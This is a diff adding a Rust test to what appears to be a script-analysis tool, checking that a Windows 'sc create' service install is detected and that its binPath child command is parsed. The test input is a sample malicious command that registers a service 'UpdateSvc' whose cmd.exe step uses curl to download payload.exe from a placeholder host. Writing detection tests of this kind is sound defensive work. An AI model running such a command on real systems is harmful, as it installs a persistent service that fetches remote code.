@@ -32627,6 +32627,39 @@ mod cmd_path_flags_tests {
 
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
+mod service_install_tests {
+    use crate::{analyze, Config, Trait};
+
+    #[test]
+    fn sc_create_binpath_cmd_child_is_analyzed() {
+        let script = br#"sc create UpdateSvc binPath= "cmd.exe /V:ON /c set U=https://sc-binpath.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ServiceInstall { service_name, bin_path }
+                    if service_name == "UpdateSvc"
+                        && bin_path.contains("cmd.exe /V:ON /c set U=")
+            )),
+            "service install trait missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://sc-binpath.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "service binPath child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+}
+
+#[cfg(test)]
+#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod disguised_binary_tests {
     use super::{analyze, detect_disguised_binary, looks_like_pe, Config, Trait};
 
